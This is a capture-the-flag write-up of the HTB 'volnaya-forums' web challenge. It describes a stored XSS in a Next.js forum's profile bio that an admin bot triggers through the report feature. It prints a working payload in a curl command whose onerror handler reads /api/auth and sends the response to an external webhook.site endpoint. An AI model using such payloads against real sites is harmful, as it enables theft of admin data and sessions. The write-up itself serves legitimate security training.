+++
title = 'HTB Global Cyber Skills Benchmark 2025 - web/volnaya-forums'
date = 2025-05-27T21:44:01-04:00
draft = false
+++


Volnaya Forums is a Next.js web application simulating a forum platform. The goal was to obtain the flag, which is only accessible to the admin user via the /api/auth endpoint.

We are first presented with a login page, where we can create a new user and login

![volnaya1](/images/volnaya1.png)

The forum is filled with posts, and we are not allowed to post but we can report posts.

![volnaya2](/images/volnaya2.png)

Also, we have a user profile:

![volnaya3](/images/volnaya3.png)



The flag is served at session.user.username === 'admin'
/api/auth and only returned when `session.user.username === 'admin'`. There is a Puppeteer bot ( bot.ts ) that logs in as admin and visits URLs submitted via the
report system. Report System: Users can submit reports that trigger the admin bot to visit specified URL's. 


In profile, the description field is not sanatized and vulnerable to xss:


```html
    <div
        className="prose"
        dangerouslySetInnerHTML={{ __html: profile.bio }}
    />
) : (
    <p className="text-muted-foreground">Not specified</p>
)}
```

To exploit, first we can inject XSS into our profile. Next, we create a report and have the admin bot vist our profile. Our XSS payload will steal the admin bots flag.

After trying a few payloads, this one worked:

`<img src=x onerror=alert(1)>`

I used webhook.site to create an endpoint for recieving the stolen flag.

The final payload:

```bash
curl -X POST http://94.237.58.230:49969/api/profile \
 -H "Content-Type: application/json" \
 -H "Cookie: session=Fe26.2*1*60aea579f24f916652493cefdfd05c13df3cf23cc91ebd01ca1bf4e882112db5*KXrgy19_cNK5pt7UJcnxOg*_8hraS_UOF9aC-m5IHokrEHVVmZDRPg_r1NN23sYtAlgoWZNgwvreSwZmpq8w-zgw0wP9m8G0REU1mlIMsK_dtPpLfic6fdHOx2SNfG0erI*1749402914006*274696f327feaa70b1901c0fb2a903777f01fd7ee5efdcb48c59c96211107dcb*X9KmEZsSFFoh5exBpivNcilsA5kaYeolIWu7I-57KJs~2" \
 -d '{"username":"admin","email":"dfoo@test.com","bio":"<img src=x onerror=\"fetch('\''/api/auth'\'').then(r=>r.text()).then(d=>fetch('\''https://webhook.site/f2ad00ee-36fa-46f6-84ed-ffa208392a0a?flag='\''+encodeURIComponent(d)))\">"}'
 ```

 We then trigger the bot to visit our profile by creating a report, and get the flag.